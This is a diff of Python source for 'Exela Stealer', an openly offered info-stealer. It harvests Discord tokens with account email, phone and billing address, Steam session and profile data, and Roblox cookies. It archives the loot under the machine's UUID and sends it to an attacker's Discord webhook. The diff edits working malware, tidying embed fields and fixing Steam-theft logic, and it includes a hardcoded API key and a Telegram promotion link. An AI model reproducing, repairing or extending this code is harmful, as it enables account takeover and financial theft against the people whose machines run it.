@@ -77,7 +77,7 @@ class SubModules:
 
 class QuicaxdExela:
     def __init__(self):
-        self.hook = dhooks.Webhook(UrLxD,avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
+        self.hook = dhooks.Webhook(UrLxD,username="quicaxd")
         self.local_app_data = os.getenv("LOCALAPPDATA")
         self.roaming_app_data = os.getenv('appdata')
         self.MozillaPath = os.path.join(self.roaming_app_data, "Mozilla", "Firefox", "Profiles")
@@ -548,11 +548,7 @@ class QuicaxdExela:
                 filee = open(steamLocalUserDataPath, "r", encoding="utf-8", errors="ignore")
                 data = filee.read()
                 steamid = re.findall(r"7656[0-9]{13}", data)
-                for remember in data:
-                    if 'RememberPassword' in remember:
-                        self.steam = True
                 if steamid:
-                    embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Steam Session Detected***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
                     result = "".join(steamid)
                     accountInfo = requests.get('https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=' + result).text
                     playerInfo = requests.get('https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=' + result).json()
@@ -563,6 +559,8 @@ class QuicaxdExela:
                     profileURL = dataa["profileurl"]
                     displayName = dataa["personaname"]
                     timecreated = dataa["timecreated"]
+                    embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Steam Session Detected***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
+
                     embed.set_thumbnail(url=pp)
                     embed.add_field(name="Steam Identifier", inline=False, value=f"```{idf}```")
                     embed.add_field(name="Profile URL",  inline=False,value=f"```{profileURL}```")
@@ -575,6 +573,8 @@ class QuicaxdExela:
                     self.steamm.append(f"Steam Identifier : {idf}\nProfile URL : {profileURL}\nProfil Name : {displayName}\nTime Created : {timecreated}\nPlayer Level : {data2}\n==========================================================================")
         except Exception as e:
             print(str(e))
+        else:
+            print("succes")
     def setRoblox(self, cookie, value):
         try:
             email = ""
@@ -681,18 +681,18 @@ class QuicaxdExela:
                     else:dcpp += ".gif"
                     embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected on {browserorname}***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
                     embed.set_thumbnail(url=dcpp)
-                    embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID",inline=True, value=f"```{id}```")
-                    embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username",inline=True, value=f"```{req.json()['username']}```")
-                    embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Email",inline=True, value=f"```{req.json()['email']}```")
+                    embed.add_field(name="ID",inline=True, value=f"```{id}```")
+                    embed.add_field(name="Username",inline=True, value=f"```{req.json()['username']}```")
+                    embed.add_field(name="Email",inline=True, value=f"```{req.json()['email']}```")
                     if req.json()["phone"] != None:
-                        embed.add_field(name="<:starxglow:996004217699434496> Phone",inline=True, value=f"```{req.json()['phone']}```")
-                    embed.add_field(name="<:mfa:1021604916537602088> IS MFA Enabled",inline=True, value=f"```{req.json()['mfa_enabled']}```")
+                        embed.add_field(name="Phone",inline=True, value=f"```{req.json()['phone']}```")
+                    embed.add_field(name="IS MFA Enabled",inline=True, value=f"```{req.json()['mfa_enabled']}```")
                     if payment == 0:nitro="No Nitro"
                     elif payment == 1:nitro="Nitro Classic"
                     elif payment == 2:nitro="Normal Classic"
                     elif payment == 3:nitro="Nitro Basic"
                     else:nitro="Unkown"
-                    embed.add_field(name="<a:pinklv:996004222090891366> Nitro Billing", value=f"```{nitro}```")
+                    embed.add_field(name="Nitro Billing", value=f"```{nitro}```")
                     if "billing_address" in req2.text:
                         dataa = req2.json()[0]
                         billgininfo = f"{dataa['billing_address']['line_1']}, {dataa['billing_address']['city']}, " + f"{dataa['billing_address']['country']}, " + f"{dataa['billing_address']['postal_code']}, "
@@ -700,8 +700,8 @@ class QuicaxdExela:
                     else:
                         pass
                     if req.json()['bio'] != "":
-                        embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=False, value=f"```{req.json()['bio']}```")
-                    embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=False, value=f"```{f}```")
+                        embed.add_field(name="biography",inline=False, value=f"```{req.json()['bio']}```")
+                    embed.add_field(name=f"Token",inline=False, value=f"```{f}```")
                     embed.set_footer(text="https://t.me/ExelaStealer")
                     self.hook.send(embed=embed)
                     self.discordd.append(f"Discord ID : {id}\nUsername : {req.json()['username']}\nEmail : {req.json()['email']}\nis mfa Enabled : {req.json()['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
@@ -782,7 +782,7 @@ class QuicaxdExela:
         command = "wmic csproduct get uuid"
         run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
         shutil.make_archive(os.getenv('temp') + f"\\{run}", "zip", os.getenv('temp') + f"\\{run}")
-        hooksxdd = dhooks.Webhook(UrLxD, avatar_url="https://i.hizliresim.com/a28jbcj.jfif", username="i fucked her (quicaxd <3)")
+        hooksxdd = dhooks.Webhook(UrLxD,username="i fucked her (quicaxd <3)")
         filee = dhooks.File(os.getenv('temp') + f"\\{run}.zip")
         embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Stealer***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
         embed.set_thumbnail(url="https://i.hizliresim.com/8po0puy.jfif")
@@ -979,7 +979,7 @@ class QuicaxdExela:
                 for re in self.discordd:
                     q.write(str(re) + "\n")
 
-        if not self.steam:
+        if self.steam:
             os.mkdir(tmp + f"\\{run}\\Steam")
             with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
